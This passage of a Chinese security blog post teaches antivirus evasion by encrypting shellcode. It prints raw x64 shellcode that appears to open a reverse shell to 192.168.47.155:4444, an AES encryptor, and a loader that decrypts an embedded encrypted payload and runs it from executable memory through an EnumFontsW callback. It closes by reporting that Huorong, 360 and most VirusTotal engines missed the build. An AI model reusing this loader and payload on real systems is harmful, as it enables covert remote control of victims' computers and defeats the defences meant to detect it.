class="string">&quot;\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line">	<span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00&quot;</span></span><br><span class="line">	<span class="string">&quot;\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49&quot;</span></span><br><span class="line">	<span class="string">&quot;\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x2f\x9b\x41\x54&quot;</span></span><br><span class="line">	<span class="string">&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5&quot;</span></span><br><span class="line">	<span class="string">&quot;\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b&quot;</span></span><br><span class="line">	<span class="string">&quot;\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31&quot;</span></span><br><span class="line">	<span class="string">&quot;\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41&quot;</span></span><br><span class="line">	<span class="string">&quot;\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58&quot;</span></span><br><span class="line">	<span class="string">&quot;\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5&quot;</span></span><br><span class="line">	<span class="string">&quot;\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00&quot;</span></span><br><span class="line">	<span class="string">&quot;\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58&quot;</span></span><br><span class="line">	<span class="string">&quot;\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00&quot;</span></span><br><span class="line">	<span class="string">&quot;\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68&quot;</span></span><br><span class="line">	<span class="string">&quot;\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba&quot;</span></span><br><span class="line">	<span class="string">&quot;\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line">	<span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9&quot;</span></span><br><span class="line">	<span class="string">&quot;\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68&quot;</span></span><br><span class="line">	<span class="string">&quot;\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f&quot;</span></span><br><span class="line">	<span class="string">&quot;\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49&quot;</span></span><br><span class="line">	<span class="string">&quot;\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48&quot;</span></span><br><span class="line">	<span class="string">&quot;\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2&quot;</span></span><br><span class="line">	<span class="string">&quot;\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//生成随机16位的key值和iv值</span></span><br><span class="line">	<span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>)); <span class="comment">// initialize random seed</span></span><br><span class="line">	string g_key = <span class="built_in">random_string</span>(<span class="number">16</span>);</span><br><span class="line">	string g_iv = <span class="built_in">random_string</span>(<span class="number">16</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;key值: &quot;</span> &lt;&lt; g_key &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;iv值: &quot;</span> &lt;&lt; g_iv &lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将shellcode字节数组转换成十六进制字符串</span></span><br><span class="line">	<span class="type">size_t</span> bufLen = <span class="built_in">sizeof</span>(buf) / <span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) - <span class="number">1</span>;</span><br><span class="line">	string OriginalShellcode = <span class="built_in">toHexString</span>(buf, bufLen);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;未加密的shellcode: &quot;</span> &lt;&lt; OriginalShellcode &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//对shellcode字符串进行加密</span></span><br><span class="line">	string EncryptShellcode = <span class="built_in">EncryptionAES</span>(OriginalShellcode,g_key.<span class="built_in">c_str</span>(),g_iv.<span class="built_in">c_str</span>());</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;加密后的shellcode: &quot;</span> &lt;&lt; EncryptShellcode &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//对加密后的shellcode字符串进行解密</span></span><br><span class="line">	string DecryptShellcode = <span class="built_in">DecryptionAES</span>(EncryptShellcode, g_key.<span class="built_in">c_str</span>(), g_iv.<span class="built_in">c_str</span>());</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;解密后的shellcode: &quot;</span> &lt;&lt; DecryptShellcode &lt;&lt; endl;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>Shellcode_AesDecrypt.cpp</code>用来解密shellcode并加载，此处还调用了lazy_importer库的函数:<a target="_blank" rel="noopener" href="https://github.com/JustasMasiulis/lazy_importer%EF%BC%8C%E6%AD%A4%E5%BA%93%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9Fapi%E5%87%BD%E6%95%B0">https://github.com/JustasMasiulis/lazy_importer，此库实现动态调用系统api函数</a>, 只需在函数前面添加(<code>LI_FN</code>), 若此函数的某个参数需填<code>NULL</code>, 那么需要改成<code>nullptr</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lazy_importer.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Shellcode加密库.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">char</span> g_key[<span class="number">17</span>] = <span class="string">&quot;M7N@ExCVB@dFd]3W&quot;</span>;   <span class="comment">//填写key密钥</span></span><br><span class="line"><span class="type">char</span> g_iv[<span class="number">17</span>] = <span class="string">&quot;&#125;%?#U)6;9#uOg6gL&quot;</span>;  <span class="comment">//定义iv向量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 加密后的shellcode</span></span><br><span class="line">	string buf = <span class="string">&quot;Zq3ejgFVl/qtP/dqcQidBN6BKWTiL/KZZpfW+Iy8ZMnaA4Au2oEHMltr8TihG9yvvQ1MDt0PFqboWsF5ka9y72L9xJ5a4HRBFspK3vMwvtKMH8Xtko6ErmfUUB8pv4n4DybjQseeuYtPqEDGvX8zlwONk9nyu5r8aozfNCxLvnbFyzX5OLInbra87Az3FGhilZnCwMufIPZLgolhRkgyhnS96CsMst/pNz4AqcCNmfe7Gw1rcuVgHqETNxwIsNzWDmUguUJ173NHAZJpKmF1k39IYnF4JMvVk3QH81jzX68ClhGvADXnPlmz20PHzzjKOzkovpW4cPT3Q/1B2HOwWwhKPZdLKakJeuSa1YLwv6Nu3UdP8II6dGDVsgb4y/U7O1aiHbJFXSM5XXx7eKqTe8MV8gLfwNNR6M4qaWEm7XmdsE0WryhL5F1SFe/6uxPrcIFnGE3I0jVntLjYfVWotkkrEgL7M6rXlOgKHF3Pd6AIIPm23zULA9NyJsHuKmqOUgyzf7LiPxPcIqhNo5DA1opqCqBS3XTeusUjr6x3AyBT9MquUeJKuB7BBtWJWyuQzTzzSXaDRmErc6lSTM+DKTo101TZYKz4Jl2I8xDMey7IJT+Z1iYt/thgi1FeRLnrGAFKhNn3xAqjYORcKXLPGkSWq1MoZZxOJi6QF1uqMlB3tDBD6w/pAhuqHR+ZxnaHjfbqybG8rNLXc6hshmazoiFakC9QwHM9RgyVde9GGpkNr+wzjp1Tc1SbXSHtFHXumU1IP6NvLqU0/tWrTui9t8nrsqNFgGlQUXyAzmnk04vXJeD7kxGbSFSXwffPGUlOtDS1q/+P+fwj+ZvjpmiPLzoo+hgZ0UOtyO1ThltWr4rWitqMPneleC11qlVcyOp0odOTxuZiUeJyTOY9wHWwXg3snVWat23VSE7eQ4QWcF/GtfRVBsiGGENo1hH1nuxNTlEx/2os30f3IOj/yUfIXpuwHaWsNwlyw6119Z3PgCOdR+1qDCvJenZEsCkyjUJ830xC1V5VxCw1m0btTP+LaefsNEocc5V7fyNyaw0o72yl/g+bacycAbG/hIJlWbaXneDFysBLPtLFJjXm0gAsE3iyffdB9l6c8ffohInaNlWC8x7IDb4X6vrFC8cncDFb3NKIInVFR6bmqXfxXAamxzKXdpVjngPZg6YCWpTUtobZhThnhpO1KZxvHoFCcidxLq+mifWHpcldcS/ez2vWGdriSbd6i9FGGaxQQvHze1HmaLP/sj34JDMfIVfOI2/4sejnjluKfhcu5I0P76idHJKMDHr+rJBtpSxX3jc+UNlfeFmhjuN2Yy/TO1kLRfUdfAeZP2Vz4WhITdRf8bvqJA==&quot;</span>;</span><br><span class="line">	<span class="comment">// 解密shellcode</span></span><br><span class="line">	string strbuf = <span class="built_in">DecryptionAES</span>(buf, g_key, (<span class="type">char</span>*)g_iv);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将解密的shellcode放到shellcode数组中</span></span><br><span class="line">	<span class="type">char</span>* p = (<span class="type">char</span>*)strbuf.<span class="built_in">c_str</span>();</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>* shellcode = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">calloc</span>(strbuf.<span class="built_in">length</span>() / <span class="number">2</span>, <span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>));</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; strbuf.<span class="built_in">length</span>() / <span class="number">2</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">sscanf</span>(p, <span class="string">&quot;%02x&quot;</span>, &amp;shellcode[i]);</span><br><span class="line">		p += <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//输出shellcode数组里的内容</span></span><br><span class="line">	<span class="type">int</span> ShellcodeSize = strbuf.<span class="built_in">length</span>() / <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Decrypted buffer:\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ShellcodeSize; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\\x%02x&quot;</span>, shellcode[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//加载shellcode</span></span><br><span class="line">	<span class="type">char</span>* orig_buffer;</span><br><span class="line">	orig_buffer = (<span class="type">char</span>*)<span class="built_in">LI_FN</span>(VirtualAlloc)(<span class="literal">nullptr</span>, ShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">RtlMoveMemory</span>(orig_buffer, shellcode, ShellcodeSize);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//使用EnumUILanguages函数执行解密后的shellcode</span></span><br><span class="line">	<span class="comment">//EnumUILanguages((UILANGUAGE_ENUMPROC)orig_buffer, 0, 0);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//LI_FN(EnumUILanguages)((UILANGUAGE_ENUMPROC)orig_buffer, 0, 0);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//使用EnumFontsW回调函数加载shellcode</span></span><br><span class="line">	<span class="built_in">EnumFontsW</span>(<span class="built_in">GetDC</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>, (FONTENUMPROCW)orig_buffer, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="运行测试-1"><a href="#运行测试-1" class="headerlink" title="运行测试"></a>运行测试</h2><p>给aes加密项目添加引用，选择Shellcode加密库</p>
+<img src="shellcode加密/image-20230516154853419.png" alt="image-20230516154853419" style="zoom:67%;" />	
+
+
+
+<p>修改项目属性，在附加包含目录处添加上Shellcode加密库项目的路径</p>
+<img src="shellcode加密/image-20230516155107883.png" alt="image-20230516155107883" style="zoom:67%;" />	
+
+
+
+<p>使用<code>Shellcode_AesEncryption.cpp</code>进行加密, 随后控制台输出key值、iv值、以及加密后的shellcode</p>
+<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230515195113865.png" alt="image-20230515195113865"></p>
+<p>打开<code>Shellcode_AesDecrypt.cpp</code>,填写上述生成的值, 随后生成可执行文件</p>
+<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230515195404012.png" alt="image-20230515195404012"></p>
+<p>将生成的可执行文件放到火绒和360里测试,没有发现报毒</p>
+<img src="shellcode加密/image-20230515201325408.png" alt="image-20230515201325408" style="zoom:67%;" />	
+
+<img src="shellcode加密/image-20230515201541815.png" alt="image-20230515201541815" style="zoom:67%;" />	
+
+
+
+<p>上传至VirusTotal检查，只有四个报毒，免杀效果还是可以的</p>
+<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230516154122994.png" alt="image-20230516154122994">	</p>
+<h1 id="Base64加密"><a href="#Base64加密" class="headerlink" title="Base64加密"></a>Base64加密</h1><h1 id="Git项目地址"><a href="#Git项目地址" class="headerlink" title="Git项目地址"></a>Git项目地址</h1><p><a target="_blank" rel="noopener" href="https://github.com/xf555er/ShellcodeEncryption">https://github.com/xf555er/ShellcodeEncryption</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/04/29/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/04/29/shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%A7%81%E9%92%A5%E5%92%8C%E5%85%AC%E9%92%A5"><span class="nav-number">1.1.</span> <span class="nav-text">什么是私钥和公钥</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%86%E8%A7%A3%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E5%92%8C%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="nav-number">1.2.</span> <span class="nav-text">了解对称加密和非对称加密</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XOR%E5%8A%A0%E5%AF%86"><span class="nav-number">2.</span> <span class="nav-text">XOR加密</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFxor%E5%8A%A0%E5%AF%86"><span class="nav-number">2.1.</span> <span class="nav-text">什么是xor加密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-number">2.2.</span> <span class="nav-text">代码实现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="nav-number">2.3.</span> <span class="nav-text">运行测试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#AES%E5%8A%A0%E5%AF%86"><span class="nav-number">3.</span> <span class="nav-text">AES加密</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFaes%E5%8A%A0%E5%AF%86"><span class="nav-number">3.1.</span> <span class="nav-text">什么是aes加密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0-1"><span class="nav-number">3.2.</span> <span class="nav-text">代码实现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E6%B5%8B%E8%AF%95-1"><span class="nav-number">3.3.</span> <span class="nav-text">运行测试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Base64%E5%8A%A0%E5%AF%86"><span class="nav-number">4.</span> <span class="nav-text">Base64加密</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Git%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80"><span class="nav-number">5.</span> <span class="nav-text">Git项目地址</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xiao Ni"
+      src="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
+  <p class="site-author-name" itemprop="name">Xiao Ni</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xiao Ni</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+#running-time
+
+<script>
+    $(document).ready(function () {
+
+        var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+        var pvcountOffset = 80000;  // 初始化首次数据
+        var uvcountOffset = 20000;
+
+        function fixCount() {
+            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
+                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
+                clearInterval(int);
+            }
+            if ($("#busuanzi_container_site_pv").css("display") != "none") {
+                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
+                clearInterval(int); // 停止检测
+            }
+        }
+    });
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
